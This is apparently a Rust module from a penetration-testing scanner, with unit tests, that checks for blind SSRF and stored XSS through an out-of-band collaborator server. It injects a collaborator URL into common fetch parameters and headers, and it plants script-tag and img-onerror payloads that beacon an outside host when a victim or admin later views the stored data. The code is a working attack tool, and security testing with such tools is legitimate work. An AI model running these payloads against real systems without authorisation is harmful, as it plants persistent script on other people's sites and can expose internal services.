//! blind_oob — blind SSRF / blind XSS / OOB injection via a collaborator.
//!
//! Opt-in: requires `opts.collaborator` = base URL of a running
//! `pentest-collaborator` listener that the TARGET can reach. Plants OOB
//! payloads, waits briefly, then polls the collaborator for interactions.
//! Blind XSS is stored — it may fire later when a victim/admin views the
//! data, so also check the collaborator dashboard afterward. Port of
//! `checks/blind_oob.py`.

use crate::opts::Opts;
use crate::registry::CheckFuture;
use pentest_core::{Finding, HttpClient, HttpRequest, Severity};
use rand::RngCore;
use std::time::Duration;

pub const NAME: &str = "blind_oob";

const FETCH_PARAMS: &[&str] = &[
    "url", "uri", "link", "src", "callback", "webhook", "feed", "image", "img", "load", "next",
    "return", "dest", "target",
];

const POLL_TIMEOUT: Duration = Duration::from_secs(6);
const POLL_INTERVAL: Duration = Duration::from_secs(1);

/// A short random hex token bucketing this run's OOB payloads on the
/// collaborator, matching Python's `uuid.uuid4().hex[:12]` in length and
/// entropy source (6 random bytes -> 12 hex chars) without pulling in a
/// full UUID library for structure (version/variant bits) that gets
/// truncated away immediately anyway.
fn random_token() -> String {
    let mut bytes = [0u8; 6];
    rand::rng().fill_bytes(&mut bytes);
    bytes.iter().map(|b| format!("{b:02x}")).collect()
}

fn payload_url(collab: &str, token: &str, tag: &str) -> String {
    format!("{}/{token}/{tag}", collab.trim_end_matches('/'))
}

pub fn run<'a>(client: &'a HttpClient, opts: &'a Opts) -> CheckFuture<'a> {
    Box::pin(run_impl(client, opts, POLL_TIMEOUT, POLL_INTERVAL))
}

async fn run_impl(
    client: &HttpClient,
    opts: &Opts,
    poll_timeout: Duration,
    poll_interval: Duration,
) -> Vec<Finding> {
    let Some(collab) = opts.collaborator.clone() else {
        return Vec::new();
    }; // opt-in; silent when not configured
    let method = opts.method.to_uppercase();
    let param = opts.param.clone();
    let mut out = Vec::new();
    let mut planted: Vec<(&'static str, String)> = Vec::new();

    // 1) Blind SSRF — inject collaborator URL into likely fetch params + headers
    let ssrf_token = random_token();
    let pu = payload_url(&collab, &ssrf_token, "ssrf");
    let mut params_to_try: Vec<&str> = Vec::new();
    if let Some(p) = &param {
        params_to_try.push(p.as_str());
    }
    params_to_try.extend(FETCH_PARAMS.iter());
    for p in params_to_try.into_iter().take(8) {
        let req = if method == "GET" {
            HttpRequest::get().param(p, &pu)
        } else {
            HttpRequest::post().form_field(p, &pu)
        };
        let _ = client.request(req).await;
    }
    // also common SSRF-via-header sinks
    for h in [
        "Referer",
        "X-Forwarded-For",
        "True-Client-IP",
        "X-Wap-Profile",
    ] {
        let _ = client.request(HttpRequest::get().header(h, &pu)).await;
    }
    planted.push(("blind SSRF (fetch params/headers)", ssrf_token));

    // 2) Blind/stored XSS — plant a script tag that beacons the collaborator
    if let Some(p) = &param {
        let xss_token = random_token();
        let xu = payload_url(&collab, &xss_token, "xss");
        let xss_payloads = [
            format!("\"><script src={xu}></script>"),
            format!("'><img src=x onerror=\"new Image().src='{xu}'\">"),
            format!("</textarea><script src={xu}></script>"),
        ];
        for pl in &xss_payloads {
            let req = if method == "GET" {
                HttpRequest::get().param(p, pl)
            } else {
                HttpRequest::post().form_field(p, pl)
            };
            let _ = client.request(req).await;
        }
        planted.push(("blind/stored XSS", xss_token));
    }

    // Poll for confirmed interactions
    for (vector, token) in planted {
        let hits = poll(&collab, &token, poll_timeout, poll_interval).await;
        if let Some(h) = hits.first() {
            out.push(
                Finding::new(
                    NAME,
                    Severity::Critical,
                    format!("Confirmed OOB interaction — {vector}"),
                    format!("target contacted the collaborator ({} hit(s))", hits.len()),
                )
                .with_evidence(format!("{} {} from {}", h.method, h.path, h.client)),
            );
        } else if vector.starts_with("blind/stored XSS") {
            out.push(
                Finding::new(NAME, Severity::Info, "Blind XSS payload planted", format!("no immediate beacon — stored XSS may fire later; watch the collaborator for token {token}"))
                    .with_evidence(token),
            );
        }
    }
    out
}

/// Polls the collaborator for hits on `token`, checking immediately and
/// then every `interval` until `timeout` elapses. Timeout/interval are
/// parameters (not hardcoded) so tests can drive this in milliseconds
/// instead of the real 6s/1s the production call site uses.
async fn poll(
    collab: &str,
    token: &str,
    timeout: Duration,
    interval: Duration,
) -> Vec<pentest_collaborator::Hit> {
    let deadline = std::time::Instant::now() + timeout;
    loop {
        if let Ok(hits) = pentest_collaborator::get_hits(collab, token).await {
            if !hits.is_empty() {
                return hits;
            }
        }
        if std::time::Instant::now() >= deadline {
            return Vec::new();
        }
        tokio::time::sleep(interval).await;
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::checks::test_support::{scripted_server, ScriptedResponse};
    use pentest_collaborator::{bind, Collaborator};
    use pentest_core::HttpClientConfig;
    use std::sync::Arc;

    fn fast_client(base_url: String) -> HttpClient {
        HttpClient::new(
            base_url,
            HttpClientConfig {
                delay: std::time::Duration::from_millis(0),
                ..HttpClientConfig::default()
            },
        )
    }

    async fn spawn_collaborator() -> String {
        let (listener, addr) = bind("127.0.0.1", 0).await.unwrap();
        let collab = Arc::new(Collaborator::new());
        tokio::spawn(collab.serve(listener));
        format!("http://{addr}")
    }

    const FAST_TIMEOUT: Duration = Duration::from_millis(200);
    const FAST_INTERVAL: Duration = Duration::from_millis(20);

    #[tokio::test]
    async fn silent_no_op_when_no_collaborator_configured() {
        let base = scripted_server(|_req, _| ScriptedResponse::ok("ok")).await;
        let client = fast_client(base);

        let findings = run_impl(&client, &Opts::default(), FAST_TIMEOUT, FAST_INTERVAL).await;

        assert!(findings.is_empty());
    }

    #[tokio::test]
    async fn confirms_blind_ssrf_when_the_target_calls_back() {
        let collab_base = spawn_collaborator().await;
        let collab_for_server = collab_base.clone();
        // Simulate a genuinely SSRF-vulnerable target: whenever it sees a
        // planted collaborator URL in the 'url' param, it fetches it
        // server-side -- exactly the vulnerability this check confirms.
        let target_base = scripted_server(move |req, _| {
            if let Some(u) = req.query.get("url") {
                if u.starts_with(&collab_for_server) {
                    let u = u.clone();
                    tokio::spawn(async move {
                        let _ = reqwest::Client::new().get(&u).send().await;
                    });
                }
            }
            ScriptedResponse::ok("ok")
        })
        .await;
        let client = fast_client(target_base);
        let opts = Opts {
            param: Some("url".to_string()),
            collaborator: Some(collab_base),
            ..Opts::default()
        };

        let findings = run_impl(&client, &opts, FAST_TIMEOUT, FAST_INTERVAL).await;

        assert!(findings
            .iter()
            .any(|f| f.title.contains("Confirmed OOB interaction — blind SSRF")));
    }

    #[tokio::test]
    async fn reports_planted_but_unconfirmed_xss_when_no_beacon_arrives() {
        let collab_base = spawn_collaborator().await;
        let target_base = scripted_server(|_req, _| ScriptedResponse::ok("stored, thanks")).await;
        let client = fast_client(target_base);
        let opts = Opts {
            param: Some("comment".to_string()),
            collaborator: Some(collab_base),
            ..Opts::default()
        };

        let findings = run_impl(&client, &opts, FAST_TIMEOUT, FAST_INTERVAL).await;

        assert!(findings
            .iter()
            .any(|f| f.title == "Blind XSS payload planted"));
        assert!(!findings.iter().any(|f| f.title.contains("Confirmed")));
    }

    #[tokio::test]
    async fn does_not_plant_xss_when_no_param_is_supplied() {
        let collab_base = spawn_collaborator().await;
        let target_base = scripted_server(|_req, _| ScriptedResponse::ok("ok")).await;
        let client = fast_client(target_base);
        let opts = Opts {
            param: None,
            collaborator: Some(collab_base),
            ..Opts::default()
        };

        let findings = run_impl(&client, &opts, FAST_TIMEOUT, FAST_INTERVAL).await;

        assert!(!findings.iter().any(|f| f.title.contains("XSS")));
    }
}
